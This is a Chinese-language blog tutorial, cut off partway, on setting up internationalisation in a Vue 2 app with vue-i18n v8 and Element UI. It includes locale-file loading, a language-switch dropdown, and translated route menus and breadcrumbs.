    <content type="html"><![CDATA[<h2 id="安装-i18n"><a href="#安装-i18n" class="headerlink" title="安装 i18n"></a>安装 i18n</h2><p><code>internationalization</code> 这个单词中，i 和 n 之间有 18 个字母</p><a id="more"></a><p><strong>注意：</strong>当前 i18n 最新版本为 9 版本，9 版本没有 VueI18n，<code>import VueI18n from &#39;vue-i18n&#39;</code> 解构会报错 <code>Cannot read property &#39;install&#39; of undefined</code></p><ul><li>这里为了让 Element 兼容，安装的是 8 版本的</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-i18n@8</span><br></pre></td></tr></table></figure><h1 id="基础配置篇"><a href="#基础配置篇" class="headerlink" title="基础配置篇"></a>基础配置篇</h1><h2 id="1-页面中使用国际化"><a href="#1-页面中使用国际化" class="headerlink" title="1.页面中使用国际化"></a>1.页面中使用国际化</h2><h3 id="i18n-文件夹下的-index-js-文件"><a href="#i18n-文件夹下的-index-js-文件" class="headerlink" title="* i18n 文件夹下的 index.js 文件"></a>* i18n 文件夹下的 index.js 文件</h3><blockquote><p><code>require.context</code></p><p>它允许传入一个目录进行搜索，一个标志指示是否应该搜索子目录，还有一个正则表达式来匹配文件</p><ul><li>第一个参数：<code>directory</code> 要搜索的文件夹目录不能是变量，否则在编译阶段无法定位目录</li><li>第二个参数：<code>useSubdirectories</code> 是否搜索子目录</li><li>第三个参数：<code>regExp</code> 匹配文件的正则表达式</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.context(<span class="string">&#x27;demo&#x27;</span>, <span class="literal">false</span>, <span class="regexp">/\.js$/</span>)</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> VueI18n <span class="keyword">from</span> <span class="string">&#x27;vue-i18n&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Cookies <span class="keyword">from</span> <span class="string">&#x27;js-cookie&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(VueI18n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> langFiles = <span class="built_in">require</span>.context(<span class="string">&#x27;./config&#x27;</span>, <span class="literal">false</span>, <span class="regexp">/\.js$/</span>)</span><br><span class="line"><span class="keyword">const</span> regExp = <span class="regexp">/\.\/([^\.\/]+)\.([^\.]+)$/</span></span><br><span class="line"><span class="keyword">const</span> messages = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> lang = &#123;</span><br><span class="line">  zh: zhCNLocale,</span><br><span class="line">  zhTW: zhTWLocale,</span><br><span class="line">  en: enLocale</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">langFiles.keys().forEach(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">  messages[k] = langFiles(key).default</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLanguage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> locale = Cookies.get(<span class="string">&#x27;lang&#x27;</span>) || <span class="string">&#x27;zh&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> (!(locale <span class="keyword">in</span> messages)) locale = <span class="string">&#x27;zh&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> locale</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> i18n = <span class="keyword">new</span> VueI18n(&#123;</span><br><span class="line">  locale: getLanguage(),</span><br><span class="line">  messages</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> i18n</span><br></pre></td></tr></table></figure><ul><li>messages 对象</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/%E5%9B%BD%E9%99%85%E5%8C%96%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6.jpg"></p><h3 id="main-js-引入"><a href="#main-js-引入" class="headerlink" title="main.js 引入"></a>main.js 引入</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> i18n <span class="keyword">from</span> <span class="string">&#x27;./i18n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">  i18n</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="展示页面"><a href="#展示页面" class="headerlink" title="展示页面"></a>展示页面</h3><p>效果图如下：</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E5%88%87%E6%8D%A2%E8%AF%AD%E8%A8%80.gif"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    &lt;el-dropdown</span><br><span class="line">      trigger=&quot;click&quot;</span><br><span class="line">      class=&quot;international&quot;</span><br><span class="line">      @command=&quot;handleSetLanguage&quot;</span><br><span class="line">    &gt;</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;el-icon-s-tools&quot;</span> /&gt;</span>切换语言<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-dropdown-menu</span> <span class="attr">slot</span>=<span class="string">&quot;dropdown&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-dropdown-item</span> <span class="attr">:disabled</span>=<span class="string">&quot;language === &#x27;zh&#x27;&quot;</span> <span class="attr">command</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line">          中文</span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-dropdown-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-dropdown-item</span> <span class="attr">:disabled</span>=<span class="string">&quot;language === &#x27;en&#x27;&quot;</span> <span class="attr">command</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">          English</span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-dropdown-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-dropdown-menu</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-dropdown</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-table</span> <span class="attr">:data</span>=<span class="string">&quot;tableData&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;date&quot;</span> <span class="attr">:label</span>=<span class="string">&quot;$t(&#x27;table.date&#x27;)&quot;</span> <span class="attr">width</span>=<span class="string">&quot;180&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;name&quot;</span> <span class="attr">:label</span>=<span class="string">&quot;$t(&#x27;table.name&#x27;)&quot;</span> <span class="attr">width</span>=<span class="string">&quot;180&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;age&quot;</span> <span class="attr">:label</span>=<span class="string">&quot;$t(&#x27;table.age&#x27;)&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line">      tableData: [</span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">          date: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          name: <span class="string">&#x27;王小虎&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          age: <span class="string">&#x27;23&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">          date: <span class="string">&#x27;2016-05-04&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          name: <span class="string">&#x27;李小鸭&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          age: <span class="string">&#x27;14&#x27;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line"><span class="javascript">      language: sessionStorage.getItem(<span class="string">&#x27;lang&#x27;</span>) || <span class="string">&#x27;zh&#x27;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">handleSetLanguage</span>(<span class="params">lang</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$i18n.locale = lang</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.language = lang</span></span><br><span class="line"><span class="javascript">      sessionStorage.setItem(<span class="string">&#x27;lang&#x27;</span>, lang)</span></span><br><span class="line">      location.reload();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="语言配置文件"><a href="#语言配置文件" class="headerlink" title="语言配置文件"></a>语言配置文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// en.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  table: &#123;</span><br><span class="line">    date: <span class="string">&#x27;Date&#x27;</span>,</span><br><span class="line">    name: <span class="string">&#x27;Name&#x27;</span>,</span><br><span class="line">    age: <span class="string">&#x27;Age&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// zh.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  table: &#123;</span><br><span class="line">    date: <span class="string">&#x27;日期&#x27;</span>,</span><br><span class="line">    name: <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    age: <span class="string">&#x27;年龄&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="英文首字母大写"><a href="#英文首字母大写" class="headerlink" title="英文首字母大写"></a>英文首字母大写</h3><p>英文情况下，需要对其进行大小写转换处理（让每个单词首字母大写）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> k <span class="keyword">in</span> langs) &#123;</span><br><span class="line">  <span class="keyword">const</span> item = langs[k]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> j <span class="keyword">in</span> item) &#123;</span><br><span class="line">    item[j] = item[j].toLowerCase().replace(<span class="regexp">/( |^)[a-z]/g</span>, <span class="function"><span class="params">L</span> =&gt;</span> L.toUpperCase())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-Element-国际化（基础）"><a href="#2-Element-国际化（基础）" class="headerlink" title="2.Element 国际化（基础）"></a>2.Element 国际化（基础）</h2><h3 id="main-js-引入-1"><a href="#main-js-引入-1" class="headerlink" title="main.js 引入"></a>main.js 引入</h3><ul><li>参考兼容 <code>vue-i18n@6.x</code> 的步骤（需要手动处理）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> i18n <span class="keyword">from</span> <span class="string">&#x27;./i18n&#x27;</span></span><br><span class="line"><span class="keyword">import</span> ElementUI <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 8版本以上需要这么使用</span></span><br><span class="line">Vue.use(ElementUI, &#123;</span><br><span class="line">  i18n: <span class="function">(<span class="params">key, value</span>) =&gt;</span> i18n.t(key, value),</span><br><span class="line">  size: <span class="string">&#x27;mini&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">  i18n</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="i18n-文件夹下的-index-js-文件-1"><a href="#i18n-文件夹下的-index-js-文件-1" class="headerlink" title="* i18n 文件夹下的 index.js 文件"></a>* i18n 文件夹下的 index.js 文件</h3><p>在 index.js 中使用 <code>Object.assign</code>  合并有一个好处：方便扩展（相对于在语言配置表引入使用扩展运算符）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> VueI18n <span class="keyword">from</span> <span class="string">&#x27;vue-i18n&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Cookies <span class="keyword">from</span> <span class="string">&#x27;js-cookie&#x27;</span></span><br><span class="line"><span class="keyword">import</span> enLocale <span class="keyword">from</span> <span class="string">&#x27;element-ui/lib/locale/lang/en&#x27;</span></span><br><span class="line"><span class="keyword">import</span> zhCNLocale <span class="keyword">from</span> <span class="string">&#x27;element-ui/lib/locale/lang/zh-CN&#x27;</span></span><br><span class="line"><span class="keyword">import</span> zhTWLocale <span class="keyword">from</span> <span class="string">&#x27;element-ui/lib/locale/lang/zh-TW&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(VueI18n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> langFiles = <span class="built_in">require</span>.context(<span class="string">&#x27;./config&#x27;</span>, <span class="literal">false</span>, <span class="regexp">/\.js$/</span>)</span><br><span class="line"><span class="keyword">const</span> regExp = <span class="regexp">/\.\/([^\.\/]+)\.([^\.]+)$/</span></span><br><span class="line"><span class="keyword">const</span> messages = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> lang = &#123;</span><br><span class="line">  zh: zhCNLocale,</span><br><span class="line">  zhTW: zhTWLocale,</span><br><span class="line">  en: enLocale</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">langFiles.keys().forEach(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> k = regExp.exec(key)[<span class="number">1</span>]</span><br><span class="line">  messages[k] = <span class="built_in">Object</span>.assign(langFiles(key).default, lang[k])</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLanguage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> locale = Cookies.get(<span class="string">&#x27;lang&#x27;</span>) || <span class="string">&#x27;zh&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> (!(locale <span class="keyword">in</span> messages)) locale = <span class="string">&#x27;zh&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> locale</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> i18n = <span class="keyword">new</span> VueI18n(&#123;</span><br><span class="line">  locale: getLanguage(),</span><br><span class="line">  messages</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> i18n</span><br></pre></td></tr></table></figure><p>到此为止，Element 和 页面国际化基本做完了，不过还有一些国际化难点，接下来说一下</p><h1 id="路由导航篇"><a href="#路由导航篇" class="headerlink" title="路由导航篇"></a>路由导航篇</h1><h2 id="1-路由菜单国际化"><a href="#1-路由菜单国际化" class="headerlink" title="1.路由菜单国际化"></a>1.路由菜单国际化</h2><h3 id="使用-te-判断是否存在语言包内"><a href="#使用-te-判断是否存在语言包内" class="headerlink" title="* 使用 $te 判断是否存在语言包内"></a>* 使用 $te 判断是否存在语言包内</h3><ul><li><p>首先需要处理一下标题名，如果这个名在语言配置文件中就直接返回，如果不在返回原信息中的标题</p><p><code>$te</code>这个方法用以判断需要翻译的<code>key</code>在你提供的<code>语言包(messages)</code>中是否存在</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">routeTitle</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">`sidebar.<span class="subst">$&#123;item.path&#125;</span>`</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.$te(name)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.$t(name)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> item.meta.title</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="展示页面-1"><a href="#展示页面-1" class="headerlink" title="展示页面"></a>展示页面</h3><p>把每一项传到处理标题的方法中，这样路由菜单国际化基本完成了，如果有多级路由，基本同理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in routesSystem&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">:index</span>=<span class="string">&quot;index.toString()&quot;</span>&gt;</span>&#123;&#123; routeTitle(item) &#125;&#125;<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> &#123; routeTitle &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/get-page-title&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">    methods: &#123;</span><br><span class="line"><span class="javascript">        routeTitle <span class="comment">// 声明一下</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-面包屑导航国际化"><a href="#2-面包屑导航国际化" class="headerlink" title="2.面包屑导航国际化"></a>2.面包屑导航国际化</h2><p>面包屑导航使用的是 <code>vue-element-admin</code> 的 Breadcrumb 组件</p><ul><li><p>我这里通过 <code>/</code> 去判断它是几级路由（暂时没有想到好方法）</p><p>因为我的例子有三级路由，一级二级路由放在 sidebar 对象中，三级路由放在 menu 中（如果都放在一个对象中，可以把这个判断去掉）</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-breadcrumb</span> <span class="attr">class</span>=<span class="string">&quot;app-breadcrumb&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">transition-group</span> <span class="attr">name</span>=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-breadcrumb-item</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in levelList&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.path&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">&quot;item.redirect === &#x27;noRedirect&#x27; || index == levelList.length - 1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;no-redirect&quot;</span>&gt;</span>&#123;&#123; breadTitle(item) &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">v-else</span>&gt;</span>&#123;&#123; breadTitle(item) &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-breadcrumb-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">transition-group</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-breadcrumb</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> &#123; breadTitle &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/get-page-title&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">breadTitle</span>(<span class="params">item</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> n = item.name</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> p = item.path</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (n.includes(<span class="string">&#x27;/&#x27;</span>)) n = n.slice(<span class="number">1</span>)</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> name</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (p.match(<span class="regexp">/\//g</span>).length !== <span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="javascript">        name = <span class="string">`sidebar.<span class="subst">$&#123;n&#125;</span>`</span></span></span><br><span class="line"><span class="javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        name = <span class="string">`menu.<span class="subst">$&#123;n&#125;</span>`</span></span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (<span class="built_in">this</span>.$te(name)) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">this</span>.$t(name)</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> item.meta.title</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样面包屑导航和路由导航的国际化也做完了</p><h1 id="组件篇"><a href="#组件篇" class="headerlink" title="组件篇"></a>组件篇</h1><h2 id="1-选择框、输入框组件"><a href="#1-选择框、输入框组件" class="headerlink" title="1.选择框、输入框组件"></a>1.选择框、输入框组件</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">:label</span>=<span class="string">&quot;$t(&#x27;viewsC.animal&#x27;)&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;animal&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;rowsFormData.animal&quot;</span> <span class="attr">:placeholder</span>=<span class="string">&quot;$t(&#x27;viewsC.animalHolder&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 